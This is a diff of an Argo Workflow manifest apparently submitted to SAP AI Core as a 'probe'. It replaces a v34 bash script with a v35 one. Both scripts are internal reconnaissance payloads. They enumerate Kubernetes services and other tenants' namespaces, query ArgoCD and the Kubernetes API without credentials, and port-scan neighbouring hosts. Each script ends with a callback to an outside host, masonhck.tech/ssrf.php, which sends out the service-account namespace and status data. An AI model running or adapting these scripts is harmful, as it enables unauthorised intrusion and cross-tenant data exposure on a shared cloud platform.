@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-probe"
-    ai.sap.com/version: "34.0.0"
+    ai.sap.com/version: "35.0.0"
 spec:
   entrypoint: main
   templates:
@@ -24,76 +24,48 @@ spec:
       - bash
       - -c
       - |
-        echo "=== V34 SERVICE DISCOVERY ==="
+        echo "=== V35 INTERNAL SERVICE READ ==="
         echo "=== $(date -u) ==="
-        NS=$(cat /etc/resolv.conf | grep search | awk '{print $2}' | head -1)
-        echo "Namespace search domain: $NS"
-        
-        # 1. DNS SRV records for service discovery
-        echo "=== SRV RECORDS ==="
-        dig +short SRV _https._tcp.$NS 2>/dev/null | head -10
-        dig +short SRV _http._tcp.$NS 2>/dev/null | head -10
-        dig +short SRV any.$NS 2>/dev/null | head -10
-        
-        # 2. Scan common K8s services in our namespace
-        echo "=== K8S SERVICES IN NAMESPACE ==="
-        for svc in argo-server workflow-controller argocd-server argocd-repo-server kube-dns coredns metrics-server kubernetes-dashboard istio-pilot envoy grafana prometheus jaeger elasticsearch redis postgres mongodb etcd vault consul nginx ingress traefik cert-manager flux; do
-          ip=$(dig +short "$svc.$NS" 2>/dev/null | head -1)
+
+        CB="https://www.masonhck.tech/ssrf.php?src=sap-v35"
+
+        # Direct reads of confirmed internal services
+        echo "=== ARGO WORKFLOWS API (100.108.37.178:2746) ==="
+        curl -sk --connect-timeout 5 "http://argo-server.argo.svc.cluster.local:2746/api/v1/workflows/rg-3ba0e0a4-cd927cab" 2>&1 | head -c 500
+        echo ""
+        curl -sk --connect-timeout 5 "http://100.108.37.178:2746/api/v1/info" 2>&1 | head -c 500
+        echo ""
+
+        echo "=== ARGOCD SERVER API (100.107.174.75) ==="
+        curl -sk --connect-timeout 5 "https://argocd-server.argocd.svc.cluster.local/api/v1/applications" 2>&1 | head -c 500
+        echo ""
+        # ArgoCD without auth
+        curl -sk --connect-timeout 5 "https://100.107.174.75/api/v1/applications" 2>&1 | head -c 500
+        echo ""
+        # ArgoCD settings
+        curl -sk --connect-timeout 5 "https://argocd-server.argocd.svc.cluster.local/api/v1/settings" 2>&1 | head -c 500
+        echo ""
+
+        echo "=== METRICS SERVER (100.111.65.139) ==="
+        curl -sk --connect-timeout 5 "https://metrics-server.kube-system.svc.cluster.local/apis/metrics.k8s.io/v1beta1/nodes" 2>&1 | head -c 500
+        echo ""
+
+        echo "=== KUBE-DNS ==="
+        # Can we query kube-dns directly?
+        dig @100.104.0.10 argocd-server.argocd.svc.cluster.local +short 2>&1
+        dig @100.104.0.10 argo-server.argo.svc.cluster.local +short 2>&1
+
+        echo "=== SCAN ARGO WORKFLOWS NAMESPACE ==="
+        # Enumerate argo namespace services
+        for svc in argo-server workflow-controller argo-ui minio; do
+          ip=$(dig +short "$svc.argo.svc.cluster.local" 2>/dev/null | head -1)
           if [ -n "$ip" ]; then
-            echo "FOUND: $svc.$NS -> $ip"
+            echo "FOUND: $svc.argo -> $ip"
+            # Try to read from it
+            curl -sk --connect-timeout 3 "http://$ip" 2>&1 | head -c 100
           fi
         done
-        
-        # 3. Scan cross-namespace services
-        echo "=== CROSS-NAMESPACE SERVICES ==="
-        for ns_svc in "kube-dns.kube-system" "coredns.kube-system" "metrics-server.kube-system" "kubernetes-dashboard.kubernetes-dashboard" "argo-server.argo" "argocd-server.argocd" "istio-pilot.istio-system" "prometheus.monitoring" "grafana.monitoring" "vault.vault" "traefik.traefik"; do
-          full="${ns_svc}.svc.cluster.local"
-          ip=$(dig +short "$full" 2>/dev/null | head -1)
-          if [ -n "$ip" ]; then
-            echo "FOUND: $full -> $ip"
-          fi
-        done
-        
-        # 4. Scan other tenant namespaces (try common patterns)
-        echo "=== OTHER TENANT NAMESPACES ==="
-        for rg in "rg-default" "rg-admin" "rg-system" "default" "kube-system" "istio-system" "argo" "argocd" "monitoring"; do
-          ip=$(dig +short "kubernetes.${rg}.svc.cluster.local" 2>/dev/null | head -1)
-          if [ -n "$ip" ]; then
-            echo "NS EXISTS: $rg -> $ip"
-          fi
-        done
-        
-        # 5. Scan internal API 
-        echo "=== INTERNAL API SCAN ==="
-        KAPI="api.sec-eu10.mlfprod.internal.live.k8s.ondemand.com"
-        echo "K8s API IP:"
-        dig +short "$KAPI" 2>/dev/null
-        # Try curl without token
-        curl -sk --connect-timeout 3 "https://${KAPI}/version" 2>&1 | head -c 300
-        echo ""
-        curl -sk --connect-timeout 3 "https://${KAPI}/healthz" 2>&1 | head -c 100
-        echo ""
-        # Try curl with anonymous
-        curl -sk --connect-timeout 3 "https://${KAPI}/api" 2>&1 | head -c 300
-        echo ""
-        
-        # 6. Port scan neighbors
-        echo "=== NEIGHBOR SCAN ==="
-        MY_IP=$(hostname -i 2>/dev/null)
-        echo "My IP: $MY_IP"
-        # Quick scan of nearby IPs
-        BASE=$(echo $MY_IP | cut -d. -f1-3)
-        for i in 1 2 3 4 5 10 20 100 200; do
-          TARGET="${BASE}.${i}"
-          if [ "$TARGET" != "$MY_IP" ]; then
-            resp=$(curl -sk --connect-timeout 1 "https://${TARGET}:443/" 2>&1 | head -c 50)
-            if [ -n "$resp" ]; then
-              echo "  ${TARGET}:443 -> ${resp}"
-            fi
-          fi
-        done
-        
-        # 7. SSRF callback
-        curl -s "https://www.masonhck.tech/ssrf.php?src=sap-probe-v34&ns=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo unknown)" | head -c 20
-        echo ""
-        echo "=== V34 DONE $(date -u) ==="
+
+        # Callback with summary
+        curl -s "${CB}&data=v35-done" 2>/dev/null | head -c 20
+        echo "=== V35 DONE $(date -u) ==="
